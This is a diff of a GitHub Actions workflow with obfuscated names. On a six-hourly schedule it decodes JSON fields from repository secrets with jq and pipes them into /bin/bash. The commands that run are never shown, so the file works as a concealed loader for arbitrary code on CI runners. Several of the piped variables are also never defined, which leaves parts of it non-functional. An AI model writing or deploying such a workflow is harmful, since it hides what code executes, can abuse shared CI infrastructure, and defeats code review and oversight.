@@ -1,21 +1,21 @@
 name: panxiaotian6789
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 3/6 * * *'
-jobs:  # 5049
+    - cron: '29 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: panxiaotian6789
         env:
-          lbr37889: ${{ secrets.lbr37889 }}
+          x44: ${{ secrets.x44 }}
         run: |
-          echo $lbr37889 | jq -r .kcm3453 | /bin/bash
-          echo $ahh11971 | jq -r .g4 | /bin/bash
-          echo $cempx0092 | jq -r .y72 | /bin/bash
-          echo $ahgu15860 | jq -r .bdptv7467 | /bin/bash
-          echo $uzwao27971 | jq -r .e2445 | /bin/bash
+          echo $x44 | jq -r .x3 | /bin/bash
+          echo $wznt2386 | jq -r .h842 | /bin/bash
+          echo $fhgw87 | jq -r .f63 | /bin/bash
+          echo $x60 | jq -r .fyc3 | /bin/bash
 
